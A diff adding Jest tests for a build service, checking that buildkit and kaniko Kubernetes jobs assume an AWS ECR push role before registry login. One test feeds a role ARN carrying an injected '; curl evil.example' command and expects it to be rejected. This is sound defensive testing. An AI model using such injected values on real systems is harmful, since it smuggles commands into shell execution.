@@ -304,6 +304,62 @@ describe('buildkitBuild', () => {
     );
   });
 
+  describe('ecrPushRoleArn', () => {
+    const roleArn = 'arn:aws:iam::123456789012:role/ecr-pusher';
+    const assumeRoleCommand = `aws sts assume-role --role-arn \\"${roleArn}\\" --role-session-name \\"lifecycle-test-service-abc123\\"`;
+
+    const useBuildDefaults = (buildDefaults: Record<string, unknown>) => {
+      (GlobalConfigService.getInstance as jest.Mock).mockReturnValue({
+        getAllConfigs: jest.fn().mockResolvedValue({
+          buildDefaults: { ...mockGlobalConfig.buildDefaults, ...buildDefaults },
+        }),
+      });
+    };
+
+    const renderJob = async (options: NativeBuildOptions = mockOptions) => {
+      await buildkitBuild(mockDeploy, options);
+      const applyCall = (shellPromise as jest.Mock).mock.calls.find((call) => call[0].includes('kubectl apply'));
+      return applyCall[0] as string;
+    };
+
+    it('assumes the push role before minting the ECR login token', async () => {
+      useBuildDefaults({ ecrPushRoleArn: roleArn });
+
+      const fullCommand = await renderJob();
+
+      expect(fullCommand).toContain(assumeRoleCommand);
+      expect(fullCommand).toContain('export AWS_SESSION_TOKEN=$(echo \\"$ECR_PUSH_CREDENTIALS\\" | cut -f3)');
+      expect(fullCommand.indexOf(assumeRoleCommand)).toBeLessThan(
+        fullCommand.indexOf('aws ecr get-login-password --region ${AWS_REGION}')
+      );
+    });
+
+    it('logs in with the pod identity when no push role is configured', async () => {
+      const fullCommand = await renderJob();
+
+      expect(fullCommand).not.toContain('aws sts assume-role');
+      expect(fullCommand).toContain('aws ecr get-login-password --region ${AWS_REGION}');
+    });
+
+    it('keeps the assume-role step inside the ECR login branch', async () => {
+      useBuildDefaults({ ecrPushRoleArn: roleArn });
+
+      const fullCommand = await renderJob();
+
+      expect(fullCommand.indexOf('Detected AWS ECR registry')).toBeLessThan(fullCommand.indexOf(assumeRoleCommand));
+      expect(fullCommand.indexOf(assumeRoleCommand)).toBeLessThan(
+        fullCommand.indexOf('Using in-cluster registry: ${REGISTRY_DOMAIN}')
+      );
+    });
+
+    it('rejects a malformed push role before creating a Job', async () => {
+      useBuildDefaults({ ecrPushRoleArn: 'arn:aws:iam::123456789012:role/x; curl evil.example' });
+
+      await expect(buildkitBuild(mockDeploy, mockOptions)).rejects.toThrow('Build: invalid ecrPushRoleArn');
+      expect(shellPromise).not.toHaveBeenCalled();
+    });
+  });
+
   it('renders registry domain safely for non-ECR buildkit targets', async () => {
     const optionsWithCustomRegistry = {
       ...mockOptions,
@@ -1234,6 +1290,41 @@ describe('kaniko registry login bootstrap', () => {
     expect(fullCommand).toContain('subPath: ".docker"');
     expect(fullCommand).toContain('name: "DOCKER_CONFIG"');
     expect(fullCommand).toContain('value: "/kaniko/.docker"');
+  });
+
+  it('assumes the configured push role in the registry-login container', async () => {
+    (GlobalConfigService.getInstance as jest.Mock).mockReturnValue({
+      getAllConfigs: jest.fn().mockResolvedValue({
+        buildDefaults: { ecrPushRoleArn: 'arn:aws:iam::123456789012:role/ecr-pusher' },
+      }),
+    });
+    const { kanikoBuild } = require('../engines');
+    await kanikoBuild(mockDeploy, baseOptions);
+
+    const applyCall = (shellPromise as jest.Mock).mock.calls.find((call) => call[0].includes('kubectl apply'));
+    const fullCommand = applyCall[0];
+    const assumeRoleCommand =
+      'aws sts assume-role --role-arn \\"arn:aws:iam::123456789012:role/ecr-pusher\\" ' +
+      '--role-session-name \\"lifecycle-test-service-abc123\\"';
+
+    expect(fullCommand).toContain(assumeRoleCommand);
+    expect(fullCommand.indexOf(assumeRoleCommand)).toBeLessThan(
+      fullCommand.indexOf('aws ecr get-login-password --region us-east-1')
+    );
+  });
+
+  it('ignores the push role for non-ECR registries', async () => {
+    (GlobalConfigService.getInstance as jest.Mock).mockReturnValue({
+      getAllConfigs: jest.fn().mockResolvedValue({
+        buildDefaults: { ecrPushRoleArn: 'arn:aws:iam::123456789012:role/ecr-pusher' },
+      }),
+    });
+    const { kanikoBuild } = require('../engines');
+    await kanikoBuild(mockDeploy, { ...baseOptions, ecrDomain: 'registry.internal.svc.cluster.local' });
+
+    const applyCall = (shellPromise as jest.Mock).mock.calls.find((call) => call[0].includes('kubectl apply'));
+
+    expect(applyCall[0]).not.toContain('aws sts assume-role');
   });
 
   it('keeps non-ECR login bootstrap generic', async () => {
